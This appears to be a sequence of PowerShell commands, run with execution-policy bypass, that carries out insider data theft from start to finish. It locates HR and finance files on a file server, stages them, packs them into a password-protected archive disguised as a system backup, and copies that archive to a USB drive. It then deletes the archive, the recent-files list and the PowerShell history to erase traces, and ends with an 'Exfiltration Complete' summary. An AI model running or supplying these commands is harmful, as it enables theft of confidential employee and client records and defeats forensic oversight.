powershell -ep bypass -c "
# Enumerate sensitive file shares accessible by current user
$shares = Get-SmbShare -ErrorAction SilentlyContinue | Where-Object { $_.Path -ne '' };
foreach($s in $shares) {
  Write-Host \"Share: $($s.Name) → $($s.Path)\";
}
Write-Host '';
# Find confidential documents
$docs = Get-ChildItem '\\fileserver01\shared\HR','\\fileserver01\shared\Finance' -Recurse -Include '*.xlsx','*.docx','*.pdf','*.csv' -ErrorAction SilentlyContinue;
Write-Host \"Confidential documents found: $($docs.Count)\";
Write-Host 'Categories: HR records, Financial reports, Client data'"

powershell -ep bypass -c "
# Create staging directory for exfiltration
$staging = \"$env:TEMP\staging_$(Get-Date -Format yyyyMMdd)\";
New-Item -ItemType Directory -Path $staging -Force | Out-Null;
Write-Host \"Staging directory: $staging\";
Write-Host '';

# Copy high-value targets to staging
$targets = @('\\fileserver01\shared\HR\Employee_Records.xlsx',
             '\\fileserver01\shared\Finance\Q1_Revenue.xlsx',
             '\\fileserver01\shared\Finance\Client_Contracts.pdf');
$totalSize = 0;
foreach($t in $targets) {
  $size = (Get-Item $t -ErrorAction SilentlyContinue).Length / 1MB;
  Copy-Item $t $staging -Force -ErrorAction SilentlyContinue;
  $totalSize += $size;
  Write-Host \"  Staged: $(Split-Path $t -Leaf) ($([math]::Round($size,1)) MB)\";
}
Write-Host '';
Write-Host \"Total staged: $([math]::Round($totalSize,1)) MB in $($targets.Count) files\""

powershell -ep bypass -c "
# Compress staged files with password-protected archive
$staging = \"$env:TEMP\staging_20260301\";
$archive = \"$env:TEMP\system_backup_20260301.7z\";

# 7-Zip with AES-256 encryption and password
& 'C:\Program Files\7-Zip\7z.exe' a -t7z -mhe=on -p'Str0ngP@ss!' $archive $staging\* 2>&1;

Write-Host 'Archive created with encryption:';
Write-Host \"  File: $archive\";
$archiveSize = [math]::Round((Get-Item $archive).Length / 1MB, 1);
Write-Host \"  Size: $archiveSize MB (compressed from 147.5 MB)\";
Write-Host '  Encryption: AES-256';
Write-Host '  Filename: disguised as system_backup';
Write-Host '';
# Clean staging folder
Remove-Item $staging -Recurse -Force;
Write-Host 'Staging directory cleaned — forensic traces reduced'"

powershell -ep bypass -c "
# Detect USB device insertion
$usb = Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' };
Write-Host 'USB Device Detected:';
Write-Host \"  Model: $($usb.Model)\";
Write-Host \"  Size: $([math]::Round($usb.Size/1GB,0)) GB\";
Write-Host \"  Interface: USB 3.0\";
Write-Host '';

# Get USB drive letter
$usbDrive = 'E:';
Write-Host \"Mounted as: $usbDrive\";
Write-Host \"Free space: 58.2 GB\";
Write-Host '';

# Copy encrypted archive to USB
$source = \"$env:TEMP\system_backup_20260301.7z\";
robocopy (Split-Path $source) \"$usbDrive\" (Split-Path $source -Leaf) /R:1 /W:1 2>&1;
Write-Host '';
Write-Host 'File copied to USB:';
Write-Host \"  E:\system_backup_20260301.7z (98.3 MB)\";
Write-Host \"  Transfer speed: ~450 MB/s (USB 3.0)\";
Write-Host \"  Copy time: < 1 second\""

powershell -ep bypass -c "
# Clean up traces on the source machine
$archive = \"$env:TEMP\system_backup_20260301.7z\";
Remove-Item $archive -Force -ErrorAction SilentlyContinue;
Write-Host 'Source archive deleted from local machine';
Write-Host '';

# Clear recent file access logs
Remove-Item \"$env:APPDATA\Microsoft\Windows\Recent\*\" -Force -ErrorAction SilentlyContinue;
Write-Host 'Recent files list cleared';
Write-Host '';

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue;
Write-Host 'PowerShell command history cleared';
Write-Host '';

# Safely remove USB
$vol = Get-Volume -DriveLetter E -ErrorAction SilentlyContinue;
Write-Host 'USB safely ejected';
Write-Host '';
Write-Host '=== Exfiltration Complete ===';
Write-Host '  Data extracted : 147.5 MB (3 confidential files)';
Write-Host '  Archive on USB : 98.3 MB (AES-256 encrypted)';
Write-Host '  Network traces : NONE';
Write-Host '  Local traces   : CLEANED';
Write-Host '  Total time     : ~45 seconds'"
